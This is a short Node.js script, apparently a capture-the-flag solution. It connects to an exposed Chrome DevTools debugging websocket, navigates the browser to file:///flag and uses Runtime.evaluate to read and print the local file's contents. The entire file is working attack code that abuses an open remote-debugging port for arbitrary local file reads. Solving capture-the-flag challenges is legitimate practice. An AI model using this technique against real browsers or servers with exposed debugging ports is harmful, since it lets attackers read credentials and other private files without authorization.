const CDP = require('chrome-remote-interface');

async function getFlag() {
  let client;
  try {
    console.log('Connecting to the remote Chrome instance...');
    // Connect to the remote Chrome instance
    client = await CDP({ target: 'ws://localhost:1337/devtools/page/EF9C81924892F61908532AD6BFF31937' });

    const { Page, Runtime } = client;

    console.log('Enabling Page and Runtime domains...');
    // Enable Page and Runtime
    await Page.enable();
    await Runtime.enable();

    console.log('Navigating to file:///flag...');
    // Navigate to file URL
    const navigateResult = await Page.navigate({ url: 'file:///flag' });
    await Page.loadEventFired();

    console.log('Extracting flag content...');
    // Execute JavaScript to read the flag file content
    const evaluation = await Runtime.evaluate({
      expression: `
        (function() {
          try {
            return document.body.innerText || 'No content found';
          } catch (err) {
            return 'Error: ' + err.message;
          }
        })()
      `,
      returnByValue: true
    });

    console.log('Evaluation result:', evaluation);

    // Log the flag or error
    if (evaluation.result.value.startsWith('Error:')) {
      console.error('Error:', evaluation.result.value);
    } else {
      console.log('Flag:', evaluation.result.value);
    }

  } catch (err) {
    console.error('Error:', err);
  } finally {
    if (client) {
      await client.close();
    }
  }
}

getFlag();

